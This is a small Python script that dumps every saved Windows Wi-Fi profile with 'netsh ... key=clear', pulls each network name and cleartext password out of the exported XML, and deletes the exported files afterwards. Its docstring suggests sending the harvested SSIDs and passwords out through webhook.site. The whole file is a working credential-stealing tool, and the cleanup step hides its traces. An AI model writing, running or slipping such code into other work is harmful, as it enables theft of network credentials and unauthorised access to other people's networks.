import subprocess
import os
import json

"""
Extracts the name and password from all WiFis that the machine has saved

Tip:
https://www.webhook.site  -> SSIDs and Passwords can be sent as Webhooks
"""


# WIFI_FILE_PREFIX = "Wi-Fi"
WIFI_FILE_PREFIX = "WLAN"



def get_wlans():
    wifi_files = []
    wifis = []

    # Generates Files with WiFi Data inside
    subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

    # Searches generated files
    dir = os.getcwd()
    for filename in os.listdir(dir):
        if filename.startswith(WIFI_FILE_PREFIX) and filename.endswith(".xml"):    # WIFI_FILE_PREFIX is either "Wi-Fi" or "WLAN"
            wifi_files.append(filename)

    # Extracts WiFi Name and Password from files
    for file in wifi_files:
        with open(file, "r") as f:
            for line in f.readlines():
                if "name" in line:           # "name" is the name of the Wlan
                    line = line.strip()
                    name = line[6:-7]
                if "keyMaterial" in line:     # "keyMaterial" is the password
                    line = line.strip()
                    password = line[13:-14]

                    wifis.append({"ssid" : name, "password" : password})

    # Removes WiFi files
    for file in os.listdir(dir):
        if file.startswith(WIFI_FILE_PREFIX) and file.endswith(".xml"):
            os.remove(file)

    return wifis
